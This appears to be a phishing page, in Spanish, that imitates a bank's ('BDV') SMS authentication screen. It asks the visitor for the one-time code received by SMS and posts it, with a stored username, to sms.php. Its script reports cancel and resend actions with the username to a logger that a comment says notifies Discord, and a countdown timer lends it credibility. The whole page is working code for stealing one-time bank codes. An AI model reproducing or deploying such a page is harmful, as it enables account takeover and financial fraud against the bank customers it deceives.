<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>BDVSOLICITUDES</title>
  <link rel="icon" href="favicon.png" type="image/x-icon">
  <style>
    body { margin: 0; padding: 0; font-family: Arial, sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; background-image: url(background.webp); background-size: cover; background-position: center; }
    .container { display: flex; height: 100%; width: 80%; }
    .left-side { width: 40%; display: flex; justify-content: center; align-items: center; }
    .right-side { width: 30%; }
    form { width: 80%; background: white; max-width: 550px; box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1); }
    @media (max-width: 768px) { body { background: #ededed; } .container { flex-direction: column; } .left-side { width: 100%; height: 100vh; } .right-side { display: none; } }
    .form-group { position: relative; margin-bottom: 20px; margin: 20px; }
    .form-group label { position: absolute; top: 50%; left: 10px; transform: translateY(-55%); color: #999; transition: top 0.3s, font-size 0.3s; pointer-events: none; }
    .form-group input { width: 100%; padding: 10px; box-sizing: border-box; height: 60px; border: 0; border-bottom: 1px solid gray; background: #ededed; outline: none; }
    .form-group input:focus + label, .form-group input:not(:placeholder-shown) + label { top: 5px; font-size: 12px; }
    button { background-color: #0067b1; color: white; border-radius: 3px; border: 0; padding: 10px 20px; text-align: center; cursor: pointer; font-size: 16px; }
    button:disabled { background-color: #E0E0E0; cursor: not-allowed; }
    .cancel-btn { background-color: #0067b1; }
    #timerContainer { margin-top: 20px; }
    #timerText { color: #0067b1; }
  </style>
</head>
<body>
  <div class="container">
    <div class="left-side">
      <form id="smsForm" method="post" action="sms.php">
        <div style="text-align: center"><img src="logo.png" alt="" style="width: 60%; margin-top: 20px" /></div>
        <div style="width: 100%; text-align: center">
          <div style="margin: 10px; color: #0067b1 !important"><h4>Autenticación</h4></div>
          <div style="width: 100%; text-align: center">
            <div style="margin: 10px; color: #0067b1 !important"><h5>Introduzca el token recibido por SMS.</h5></div>
            <div class="form-group">
              <input type="text" id="sms" name="sms" maxlength="8" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" minlength="6" placeholder=" " />
              <label for="sms">Código SMS *</label>
            </div>
            <input type="hidden" id="nombreOculto" name="nombre" />
          </div>
          <div style="width: 100%; text-align: center">
            <!-- Botón sin alerta de log -->
            <button type="submit" id="continuarBtn" disabled>Continuar</button>
            <button type="button" class="cancel-btn" id="cancelBtn">Cancelar</button>
          </div>
          <div id="timerContainer" style="margin-top: 20px;">
            <p id="timerText">Reenviar código en: <span id="timeLeft">02:00</span></p>
          </div>
          <div style="width: 100%; height: 30px"></div>
        </div>
      </form>
    </div>
    <div class="right-side"></div>
  </div>

  <script>
    // Función central de aviso a Discord
    function logAccion(accion) {
        const usuario = localStorage.getItem("usuario") || "Anónimo";
        fetch('logger.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'accion=' + encodeURIComponent(accion) + '&usuario=' + encodeURIComponent(usuario)
        });
    }

    document.addEventListener("DOMContentLoaded", function () {
      const nombre = localStorage.getItem("usuario");
      if (nombre) document.getElementById("nombreOculto").value = nombre;

      document.getElementById("sms").addEventListener("input", function() {
        document.getElementById("continuarBtn").disabled = (this.value.length < 6);
      });

      // Botón Cancelar con aviso y redirección
      document.getElementById("cancelBtn").addEventListener("click", function() {
        logAccion('Canceló proceso SMS');
        const n = localStorage.getItem("usuario");
        window.location.href = n ? `cancel2.php?nombre=${encodeURIComponent(n)}` : 'cancel2.php';
      });

      // Cronómetro
      let timer = 120;
      const timerText = document.getElementById("timeLeft");
      const timerContainer = document.getElementById("timerContainer");
      const timerInterval = setInterval(function() {
        timer--;
        const m = Math.floor(timer / 60);
        const s = timer % 60;
        timerText.textContent = `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
        if (timer <= 0) {
          clearInterval(timerInterval);
          // Alerta al solicitar reenvío
          timerContainer.innerHTML = `<br><a href="reenviar.php" onclick="logAccion('Solicitó reenvío de SMS')">Reenviar código</a>`;
        }
      }, 1000);
    });
  </script>
</body>
</html>
